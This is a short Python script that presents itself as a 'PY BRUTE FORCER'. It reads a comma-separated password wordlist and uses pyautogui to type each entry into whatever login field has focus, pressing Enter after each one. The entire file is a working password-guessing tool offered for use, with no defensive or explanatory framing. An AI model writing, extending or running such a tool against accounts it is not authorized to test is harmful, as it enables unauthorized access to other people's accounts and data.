import time
import pyautogui

class PasswordBruteForcer:
    def __init__(self):
        print('__________PY BRUTE FORCER____________')
        time.sleep(1)

    def __str__(self):
        return 'PasswordBruteForcer Class'

    def text_prompt(self):
        x = pyautogui.confirm('Click OK to begin then Enter that Path of Wordlist and click in the password field. Click Cancel to Exit.')
        if x == 'Cancel':
            exit()
        else:
            wordlist_path = input('Enter the Wordlist Path: ')
            self.pass_crack(wordlist_path)

    def pass_crack(self, file_name):
        with open(file_name, 'r') as word_file:
            words = word_file.read().split(',')

        time.sleep(10)
        for word in words:
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.typewrite(word, interval=0.0001)
            pyautogui.typewrite(['enter'])
            print(word)

if __name__ == "__main__":
    brute_forcer = PasswordBruteForcer()
    brute_forcer.text_prompt()
